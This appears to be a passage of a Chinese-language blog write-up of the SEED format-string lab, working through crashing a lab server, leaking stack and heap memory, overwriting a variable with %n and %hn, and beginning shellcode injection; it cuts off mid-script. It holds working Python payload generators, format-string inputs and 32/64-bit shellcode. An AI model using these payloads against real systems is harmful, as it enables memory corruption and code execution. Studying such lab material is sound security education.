+<p>为了使程序崩溃，只需要输入<code>%s%s%s%s%s%s%s%s%s</code>即可，总会有指针访问到不可访问的内存</p>
+<p>crash成功的标志是不显示 <code>(_)(_)  Returned properly (_)(_)</code></p>
+<h1 id="Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="Task 2: Printing Out the Server Program’s Memory"></a>Task 2: Printing Out the Server Program’s Memory</h1><h2 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data"></a>Task 2.A: Stack Data</h2><p>打印出堆栈上的数据。需要多少% x 格式说明符才能让服务器程序打印输入的前四个字节</p>
+<blockquote>
+<p>Difference between %p and %x in C/C++</p>
+<p>The %p is used to print the pointer value, and %x is <strong>used to print hexadecimal values</strong>. Though pointers can also be displayed using %u, or %x.</p>
+</blockquote>
+<p>输入</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">$ echo AAAA_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span> | nc <span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span> <span class="hljs-number">9090</span><br></code></pre></td></tr></table></figure>
+
+<p>回显</p>
+ <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | AAAA_<span class="hljs-number">11223344</span>_<span class="hljs-number">1000</span>_<span class="hljs-number">8049</span>db<span class="hljs-number">5</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5320</span>_<span class="hljs-number">80</span>e<span class="hljs-number">61</span>c<span class="hljs-number">0</span>_ffffd<span class="hljs-number">300</span>_ffffd<span class="hljs-number">228</span>_<span class="hljs-number">80</span>e<span class="hljs-number">62</span>d<span class="hljs-number">4</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5000</span>_ffffd<span class="hljs-number">2</span>c<span class="hljs-number">8</span>_<span class="hljs-number">8049</span>f<span class="hljs-number">7</span>e_ffffd<span class="hljs-number">300</span>_<span class="hljs-number">0</span>_<span class="hljs-number">64</span>_<span class="hljs-number">8049</span>f<span class="hljs-number">47</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5320</span>_<span class="hljs-number">4</span>ff_ffffd<span class="hljs-number">3</span>dd_ffffd<span class="hljs-number">300</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5320</span>_<span class="hljs-number">80</span>e<span class="hljs-number">9720</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_e<span class="hljs-number">2</span>fa<span class="hljs-number">4</span>d<span class="hljs-number">00</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5000</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5000</span>_ffffd<span class="hljs-number">8</span>e<span class="hljs-number">8</span>_<span class="hljs-number">8049</span>eff_ffffd<span class="hljs-number">300</span>_dd_<span class="hljs-number">5</span>dc_<span class="hljs-number">80</span>e<span class="hljs-number">5320</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_ffffd<span class="hljs-number">9</span>b<span class="hljs-number">4</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_dd_<span class="hljs-number">41414141</span>_<span class="hljs-number">5</span>f<span class="hljs-number">78255</span>f_<span class="hljs-number">255</span>f<span class="hljs-number">7825</span>_<span class="hljs-number">78255</span>f<span class="hljs-number">78</span>_<span class="hljs-number">5</span>f<span class="hljs-number">78255</span>f_<span class="hljs-number">255</span>f<span class="hljs-number">7825</span>_<span class="hljs-number">78255</span>f<span class="hljs-number">78</span>_<span class="hljs-number">5</span>f<span class="hljs-number">78255</span>f_<span class="hljs-number">255</span>f<span class="hljs-number">7825</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到41414141，这个就是我们写的AAAA</p>
+<p>把放到1.txt里面，输入命令<code>grep -o &#39;_&#39; 1.txt | wc - l</code></p>
+<p>1.txt：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">AAAA_<span class="hljs-number">11223344</span>_<span class="hljs-number">1000</span>_<span class="hljs-number">8049</span>db<span class="hljs-number">5</span>_<span class="hljs-number">80e5320</span>_<span class="hljs-number">80e61</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>_ffffd<span class="hljs-number">300</span>_ffffd<span class="hljs-number">228</span>_<span class="hljs-number">80e62</span>d<span class="hljs-number">4</span>_<span class="hljs-number">80e5000</span>_ffffd<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>_<span class="hljs-number">8049</span>f<span class="hljs-number">7</span>e_ffffd<span class="hljs-number">300</span>_<span class="hljs-number">0</span>_<span class="hljs-number">64</span>_<span class="hljs-number">8049</span>f<span class="hljs-number">47</span>_<span class="hljs-number">80e5320</span>_<span class="hljs-number">4</span>ff_ffffd<span class="hljs-number">3</span>dd_ffffd<span class="hljs-number">300</span>_<span class="hljs-number">80e5320</span>_<span class="hljs-number">80e9720</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_e<span class="hljs-number">2</span>fa<span class="hljs-number">4</span>d<span class="hljs-number">00</span>_<span class="hljs-number">80e5000</span>_<span class="hljs-number">80e5000</span>_ffffd<span class="hljs-number">8e8</span>_<span class="hljs-number">8049</span>eff_ffffd<span class="hljs-number">300</span>_dd_<span class="hljs-number">5</span>dc_<span class="hljs-number">80e5320</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_ffffd<span class="hljs-number">9</span>b<span class="hljs-number">4</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_dd_<span class="hljs-number">41414141</span><br></code></pre></td></tr></table></figure>
+
+<p>64个%x</p>
+<h2 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data"></a>Task 2.B: Heap Data</h2><p>已知秘密信息地址为0x080b4008</p>
+<p>我们输入的字符串最开始应该是秘密信息的地址，然后用63个%x让指针移动，64就是秘密信息的位置，使用%s打印</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N)) <span class="hljs-comment">#填充0</span><br>secret  = <span class="hljs-number">0x080b4008</span> <span class="hljs-comment">#秘密信息的地址</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (secret).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<span class="hljs-comment">#将最开始的内容改为秘密信息的地址</span><br>data = <span class="hljs-string">&quot;%x&quot;</span>*<span class="hljs-number">63</span>+<span class="hljs-string">&quot;\nmessage:%s&quot;</span><span class="hljs-comment">#偏移</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(data)] = data<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">server-<span class="hljs-number">10.9.0.5</span> |@<br>                 <span class="hljs-number">1122334410008049d</span>b580e532080e61c0ffffd300ffffd22880e62d480e5000ffffd2c88049f7effffd3000648049f4780e53205dc5dcffffd300ffffd30080e97200000000000000000000000000151470080e500080e5000ffffd8e88049effffffd3005dc5dc80e5320000ffffd9b40005dc<br>server-<span class="hljs-number">10.9.0.5</span> | message:<span class="hljs-keyword">A</span> secret message<br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-3-Modifying-the-Server-Program’s-Memory"><a href="#Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="Task 3: Modifying the Server Program’s Memory"></a>Task 3: Modifying the Server Program’s Memory</h1><p>修改服务器程序中定义的目标变量的值(继续使用10.9.0.5)。Target 的原始值是0x11223344</p>
+<h2 id="Task-3-A"><a href="#Task-3-A" class="headerlink" title="Task 3.A:"></a>Task 3.A:</h2><p>Change the value to a different value. In this sub-task, we need to change the content of<br>the target variable to something else. Your task is considered as a success if you can change it to a<br>different value, regardless of what value it may be. The address of the target variable can be found<br>from the server printout</p>
+<p>改为任意值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br>  <br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>secret  = <span class="hljs-number">0x080e5068</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (secret).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>data = <span class="hljs-string">&quot;%x&quot;</span>*<span class="hljs-number">63</span>+<span class="hljs-string">&quot;\ntarget changed:%n&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(data)] = data<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | target changed:The target variable&#x27;s value (after):  <span class="hljs-number">0</span>x<span class="hljs-number">000000</span>fc<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Task-3-B"><a href="#Task-3-B" class="headerlink" title="Task 3.B"></a>Task 3.B</h2><p> Change the value to 0x5000. In this sub-task, we need to change the content of the<br>target variable to a specific value 0x5000. Your task is considered as a success only if the vari-<br>able’s value becomes 0x5000.</p>
+<p>将值更改为0x5000</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br>  <br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>secret  = <span class="hljs-number">0x080e5068</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (secret).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>data = <span class="hljs-string">&quot;%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.19980x&quot;</span> + <span class="hljs-string">&quot;%n&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(data)] = data<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">0000000000005dcThe</span> target variable&#x27;s value (after):  <span class="hljs-number">0x00005000</span><br>server-<span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span> | (^<span class="hljs-symbol">_</span>^)(^<span class="hljs-symbol">_</span>^)  Returned properly (^<span class="hljs-symbol">_</span>^)(^<span class="hljs-symbol">_</span>^)<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Task-3-C"><a href="#Task-3-C" class="headerlink" title="Task 3.C"></a>Task 3.C</h2><p>Change the value to 0xAABBCCDD. This sub-task is similar to the previous one, except<br>that the target value is now a large number. In a format string attack, this value is the total number of<br>characters that are printed out by the printf() function; printing out this large number of characters<br>may take hours. You need to use a faster approach. The basic idea is to use %hn or %hhn, instead of<br>%n, so we can modify a two-byte (or one-byte) memory space, instead of four bytes. Printing out 216<br>characters does not take much time. More details can be found in the SEED book</p>
+<p>将值更改为0xAABBCCDD</p>
+<p>先看一下0x080e5068内存组织，由于是小端存储，因此：</p>
+<ul>
+<li>AA 0x080e506b </li>
+<li>BB 0x080e506a</li>
+<li>CC 0x080e5069 </li>
+<li>DD 0x080e5068</li>
+</ul>
+<p>先说结论：<code>data = &quot;%.8x&quot;*62 + &quot;%.43199x&quot; + &quot;%hn&quot; + &quot;%.8738x&quot; + &quot;%hn&quot;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303291557522.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个图给出了填充字符串的大致雏形</p>
+<ul>
+<li>地址A：需要更改的内存高位，为0x080e506a</li>
+<li>@@@@：对应后面%hn**%x**%hn</li>
+<li>地址B：需要更改的内存低位，为0x080e5068</li>
+<li>%.8x，输出字符，并且移动指针</li>
+<li>%hn：对应地址A</li>
+<li>%x：对应@@@@</li>
+<li>%hn：对应地址B</li>
+</ul>
+<p>AABB-12=43695</p>
+<ul>
+<li>“%.8x”*62将指针向上移动62次，并输出496个字符。43695-496=43199</li>
+<li>“%.43199x”打印出43199个字符，并将指针向上移动1次</li>
+<li>%hn改变地址内容的的2个字节，并将指针向上移动1次</li>
+<li>“%.8738x”打印出8738个字符，并将指针向上移动1次</li>
+<li>%hn改变地址内容的的2个字节，并将指针向上移动1次</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br>  <br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br>add1  = <span class="hljs-number">0x080e5068</span><br>add2  = <span class="hljs-number">0x080e5068</span>+<span class="hljs-number">2</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (add2).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>) <span class="hljs-comment">#AAAA</span><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]  =  (<span class="hljs-string">&quot;AAAA&quot;</span>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]  =  (add1).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>data = <span class="hljs-string">&quot;%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.43199x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span> + <span class="hljs-string">&quot;%.8738x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span>+<span class="hljs-built_in">len</span>(data)] = data<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000041414141The</span> target variable&#x27;s value (after):  <span class="hljs-number">0xaabbccdd</span><br>server-<span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span> | (^<span class="hljs-symbol">_</span>^)(^<span class="hljs-symbol">_</span>^)  Returned properly (^<span class="hljs-symbol">_</span>^)(^<span class="hljs-symbol">_</span>^)<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 4: Inject Malicious Code into the Server Program"></a>Task 4: Inject Malicious Code into the Server Program</h1><p>将一段恶意代码，以二进制格式注入到服务器的内存中，然后使用格式字符串漏洞修改函数的返回地址字段，因此当函数返回时，它跳转到我们注入的代码。这个任务使用的技术与前一个任务相似: 它们都修改内存中的4字节数。前一个任务修改目标变量，而此任务修改函数的返回地址字段</p>
+<h2 id="Understanding-the-Stack-Layout"><a href="#Understanding-the-Stack-Layout" class="headerlink" title="Understanding the Stack Layout"></a>Understanding the Stack Layout</h2><p>首先，我们需要根据服务器打印出来的信息计算出返回地址字段的地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303291653197.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Question-1-What-are-the-memory-addresses-at-the-locations-marked-by-2-and-3"><a href="#Question-1-What-are-the-memory-addresses-at-the-locations-marked-by-2-and-3" class="headerlink" title="Question 1: What are the memory addresses at the locations marked by 2 and 3"></a>Question 1: What are the memory addresses at the locations marked by 2 and 3</h3><p>2：ebp+4=0xffffd538+4=FFFFD53C（myprintf返回地址）</p>
+<p>3 ：0xffffd610（buffer的地址）</p>
+<blockquote>
+<p>Frame Pointer (inside myprintf):      0xffffd538</p>
+<p>The input buffer’s address:    0xffffd610</p>
+</blockquote>
+<h3 id="Question-2-How-many-x-format-specifiers-do-we-need-to-move-the-format-string-argument-pointer-to-3-？-Remember-the-argument-pointer-starts-from-the-location-above-1"><a href="#Question-2-How-many-x-format-specifiers-do-we-need-to-move-the-format-string-argument-pointer-to-3-？-Remember-the-argument-pointer-starts-from-the-location-above-1" class="headerlink" title="Question 2: How many %x format specifiers do we need to move the format string argument pointer to 3 ？ Remember, the argument pointer starts from the location above  1"></a>Question 2: How many %x format specifiers do we need to move the format string argument pointer to 3 ？ Remember, the argument pointer starts from the location above  1</h3><p>64</p>
+<h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><p>这里地址要计算正确，十六进制减十进制被Windows自带的计算器坑惨了nnnd</p>
+<ul>
+<li><strong>buf的地址：0xffffd610</strong></li>
+<li>shellcode的地址：0xffffd610+0d1364=0xffffdb64</li>
+<li>ebp的地址：0xffffd538</li>
+<li><strong>返回地址：0xffffd538+0x4=0xFFFFD53C</strong></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span 